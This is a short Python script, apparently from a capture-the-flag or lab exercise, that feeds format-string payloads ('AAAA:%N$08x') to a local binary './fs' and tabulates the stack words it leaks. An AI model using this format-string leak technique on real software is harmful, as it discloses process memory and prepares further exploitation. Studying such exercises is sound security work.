import subprocess

def get_stack_contents(payload):
    process = subprocess.Popen('./fs', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.stdin.write(payload.encode('utf-8') + b'\n')
    process.stdin.flush()
    output = process.stdout.read().decode('utf-8')
    return output

def generate_stack_table():
    table = []
    i = 1
    zero_count = 0  # Counter for continuous '00000000' occurrences

    while True:
        payload = 'AAAA:%{}$08x'.format(i)
        output = get_stack_contents(payload)
        try:
            value = output.split('AAAA:')[1].strip().split('\n')[0]
        except IndexError:
            value = "Invalid index"

        table.append((i, value))

        # Check if the value is '00000000' and increment the counter
        if value == '00000000':
            zero_count += 1
        else:
            zero_count = 0  # Reset the counter if the value is not '00000000'

        # Break the loop if '00000000' appears continuously for 5 times
        if zero_count == 5:
            break

        i += 1
    return table

# Generate the stack table
stack_table = generate_stack_table()

# Print the stack table in a GDB-like format
print("Index | Value")
print("--------------")
for index, value in stack_table:
    print(f"{index:5} | {value}")
